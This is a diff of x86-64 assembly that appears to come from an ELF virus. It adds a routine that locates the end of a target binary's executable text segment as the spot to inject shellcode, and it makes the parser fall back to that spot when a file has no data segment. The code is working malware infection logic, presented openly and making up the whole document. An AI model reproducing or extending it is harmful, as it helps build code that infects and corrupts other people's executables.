@@ -452,6 +452,7 @@ parse64elf:
 	phdr_parse_done:
 	;SECTIONS
 	mov r10, rax; pass pad as 3rd param
+	mov rax, [rsp]; so we know if we have a data_seg or not 
 	call parse64elfsec
 	
 	add rsp, 8
@@ -648,6 +649,56 @@ find_end_data_seg:
 	pop rsi
 	pop rdi
 retn
+
+; unsigned long find_end_text_seg(void *)
+; will return the offset at which shellcode starts and where dataseg ends
+find_end_text_seg:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 56]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 32]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_fets: 
+		cmp cx, WORD[rsp]
+		jge loop_fets_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_fets
+		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
+		jne continue_fets
+		;we found the data segment ! bss ect... This is where the shellcode will be
+		mov rax, QWORD[r9 + 32];store p_filesz
+		add rax, QWORD[r9 + 8]; add p_offset so this gives us "the end" of the segment
+		continue_fets:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_fets
+	loop_fets_exit: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
 ; int has_data_seg(void *) check if there's a data segment (ret = 1) or only text (ret = 0)
 has_data_seg:
 	push rdi
@@ -997,7 +1048,13 @@ parse64elfsec:
 	mov r9, rdx; we're gonna need rdx for syscalls, store fsize
 	mov QWORD[rsp+16], rdi; save void * file
 	; find offset where we will put our shellcode
+	cmp rax, 0
+	je fets_sect
 	call find_end_data_seg ; rax now contains the offset to the beg of pad & shellcode
+	jmp fes_done
+	fets_sect:
+	call find_end_text_seg
+	fes_done: 
 	mov [rsp + 8], rax
 	; first we swap file and wfd for syscalls
 	mov rbx, rsi
